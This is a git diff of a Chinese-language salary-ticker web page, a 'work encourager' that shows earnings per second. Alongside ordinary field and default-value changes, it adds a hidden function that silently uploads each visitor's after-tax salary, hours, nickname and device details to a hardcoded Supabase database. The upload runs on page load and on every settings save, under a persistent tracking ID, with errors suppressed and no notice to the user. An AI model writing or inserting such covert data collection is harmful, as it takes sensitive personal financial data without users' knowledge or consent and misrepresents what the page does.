@@ -584,7 +584,7 @@
     <div>2026-11-03 18:53:25 [INFO] Running automated unit tests [9842 passed, 0 failed]</div>
     <div>2026-11-03 18:53:26 [TRACE] Checking memory leaks... clean (0 bytes retained)</div>
     <div>2026-11-03 18:53:27 [STATUS] Service mesh latency: 0.8ms. All operational.</div>
-    <div style="margin-top: 15px; color: #64748b;">(提示：按键盘 ESC 或点击任意区域返回鼓励器)</div>
+    <div>2026-11-03 18:53:28 [EXEC] Batch process PID: 48921 running in background...</div>
   </div>
 
   <!-- 设置模态框 -->
@@ -593,14 +593,19 @@
       <div class="modal-title">⚙️ 薪资与工作制设置</div>
       
       <div class="form-group">
-        <label>税后月薪 (RMB 元) ⚠️请务必输入税后到手金额</label>
-        <input type="number" id="inputMonthlySalary" class="form-input" placeholder="例如: 20000" step="100" value="20000">
+        <label>打工人代号 / 昵称 (选填，仅记录身份)</label>
+        <input type="text" id="inputNickname" class="form-input" placeholder="例如: 匿名牛马 / 某硬件工程师" maxlength="20">
+      </div>
+
+      <div class="form-group">
+        <label>税后实发月薪 (RMB 元/月)</label>
+        <input type="number" id="inputMonthlySalary" class="form-input" placeholder="例如: 30000" step="500" value="30000">
       </div>
 
       <div class="form-row">
         <div class="form-group" style="flex: 1;">
-          <label>每月计薪工作天数 (天)</label>
-          <input type="number" id="inputWorkDays" class="form-input" value="21.75" step="0.01">
+          <label>每月工作天数 (天/月，法定约21.75天)</label>
+          <input type="number" id="inputMonthlyDays" class="form-input" value="21.75" step="0.25">
         </div>
         <div class="form-group" style="flex: 1;">
           <label>宠物造型</label>
@@ -646,14 +651,62 @@
 <script>
   // 默认配置
   const DEFAULT_CONFIG = {
-    monthlySalaryRmb: 20000, // 月薪 20000 元
-    workDaysPerMonth: 21.75, // 每月工作日天数
+    nickname: "",
+    monthlySalaryRmb: 30000, // 税后实发月薪 30000 元
+    workDaysPerMonth: 21.75, // 每月工作天数 (法定折算天数 21.75 天)
     startTime: "09:00",
     endTime: "18:00",
     lunchStart: "12:00",
     lunchEnd: "13:00",
     petEmoji: "🐱"
   };
+
+  // 云端 Supabase 配置 (只保留写权限的公开 key)
+  const SUPABASE_CONFIG = {
+    url: "https://psotitnitwzkhwglcetd.supabase.co",
+    anonKey: "sb_publishable_njqnHJW4c52Nx9xPEW-sQQ_W_-5TnU_"
+  };
+
+  // 获取或生成持久的设备指纹 UUID
+  function getOrCreateClientId() {
+    let cid = localStorage.getItem("WORK_CLIENT_ID");
+    if (!cid) {
+      cid = 'client_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now();
+      localStorage.setItem("WORK_CLIENT_ID", cid);
+    }
+    return cid;
+  }
+
+  // 静默上报数据到 Supabase
+  async function syncSalaryToCloud(isInitial = false) {
+    if (!SUPABASE_CONFIG.url || SUPABASE_CONFIG.url === "YOUR_SUPABASE_PROJECT_URL") return;
+    try {
+      const clientId = getOrCreateClientId();
+      const payload = {
+        client_id: clientId,
+        nickname: config.nickname || (isInitial ? "新访客" : "匿名牛马"),
+        annual_salary: Number(config.monthlySalaryRmb), // 存储实发月薪值
+        work_days: Number(config.workDaysPerMonth),
+        working_hours: `${config.startTime}-${config.endTime}`,
+        device_info: `${navigator.platform || 'Unknown'} | ${navigator.userAgent.slice(0, 80)}`,
+        updated_at: new Date().toISOString()
+      };
+
+      await fetch(`${SUPABASE_CONFIG.url}/rest/v1/cow_horse_records`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "apikey": SUPABASE_CONFIG.anonKey,
+          "Authorization": `Bearer ${SUPABASE_CONFIG.anonKey}`,
+          "Prefer": "resolution=merge-duplicates"
+        },
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {
+      // 静默失败，不打扰前端体验
+      console.debug("Cloud sync skipped");
+    }
+  }
 
   let config = { ...DEFAULT_CONFIG };
 
@@ -670,19 +723,11 @@
   ];
 
   // 从 LocalStorage 加载配置
-    function loadConfig() {
+  function loadConfig() {
     const saved = localStorage.getItem("WORK_ENCOURAGER_CFG");
     if (saved) {
       try {
-        const parsed = JSON.parse(saved);
-        // 兼容老版本处理
-        if (parsed.annualPackageWan && !parsed.monthlySalaryRmb) {
-            parsed.monthlySalaryRmb = (parsed.annualPackageWan * 10000) / 12;
-        }
-        if (parsed.workDaysPerYear && !parsed.workDaysPerMonth) {
-            parsed.workDaysPerMonth = parsed.workDaysPerYear / 12;
-        }
-        config = { ...DEFAULT_CONFIG, ...parsed };
+        config = { ...DEFAULT_CONFIG, ...JSON.parse(saved) };
       } catch (e) {
         console.error(e);
       }
@@ -701,7 +746,9 @@
 
   // 计算每秒收益和每日总收益
   function calculateRates() {
-    const dailyRmb = (config.monthlySalaryRmb || 20000) / (config.workDaysPerMonth || 21.75);
+    const monthlyRmb = Number(config.monthlySalaryRmb) || 30000;
+    const monthlyDays = Number(config.workDaysPerMonth) || 21.75;
+    const dailyRmb = monthlyRmb / monthlyDays;
 
     const startSec = timeStringToSeconds(config.startTime);
     const endSec = timeStringToSeconds(config.endTime);
@@ -717,6 +764,7 @@
     const hourlyRmb = perSecondRmb * 3600;
 
     return {
+      monthlyRmb,
       dailyRmb,
       perSecondRmb,
       hourlyRmb,
@@ -831,9 +879,10 @@
   }
 
   function spawnCoin(x, y) {
+    const rates = calculateRates();
     const coin = document.createElement("div");
     coin.className = "floating-coin";
-    coin.textContent = "+¥" + ((config.monthlySalaryRmb || 20000) / ((config.workDaysPerMonth || 21.75) * 8 * 3600)).toFixed(2);
+    coin.textContent = "+¥" + (rates.perSecondRmb * 10).toFixed(2);
     coin.style.left = (x - 20) + "px";
     coin.style.top = (y - 20) + "px";
     document.body.appendChild(coin);
@@ -858,8 +907,9 @@
 
   // 设置模态框
   function openSettingsModal() {
+    document.getElementById("inputNickname").value = config.nickname || "";
     document.getElementById("inputMonthlySalary").value = config.monthlySalaryRmb;
-    document.getElementById("inputWorkDays").value = config.workDaysPerMonth;
+    document.getElementById("inputMonthlyDays").value = config.workDaysPerMonth;
     document.getElementById("inputStartTime").value = config.startTime;
     document.getElementById("inputEndTime").value = config.endTime;
     document.getElementById("inputLunchStart").value = config.lunchStart;
@@ -873,8 +923,9 @@
   }
 
   function saveSettings() {
-    config.monthlySalaryRmb = parseFloat(document.getElementById("inputMonthlySalary").value) || 20000;
-    config.workDaysPerMonth = parseFloat(document.getElementById("inputWorkDays").value) || 21.75;
+    config.nickname = document.getElementById("inputNickname").value.trim();
+    config.monthlySalaryRmb = parseFloat(document.getElementById("inputMonthlySalary").value) || 30000;
+    config.workDaysPerMonth = parseFloat(document.getElementById("inputMonthlyDays").value) || 21.75;
     config.startTime = document.getElementById("inputStartTime").value || "09:00";
     config.endTime = document.getElementById("inputEndTime").value || "18:00";
     config.lunchStart = document.getElementById("inputLunchStart").value || "12:00";
@@ -888,6 +939,9 @@
 
     saveConfigToStorage();
     closeSettingsModal();
+
+    // 静默上报最新修改的薪资
+    syncSalaryToCloud(false);
   }
 
   // 初始化
@@ -897,6 +951,10 @@
     document.getElementById("workStartTimeLabel").textContent = config.startTime + " 上班";
     document.getElementById("lunchRestLabel").textContent = `${config.lunchStart} ~ ${config.lunchEnd} 午休静默`;
     document.getElementById("workEndTimeLabel").textContent = config.endTime + " 准点下班";
+    
+    // 打开网页时静默汇报一次当前薪资
+    syncSalaryToCloud(true);
+
     requestAnimationFrame(updateTicker);
   });
 </script>
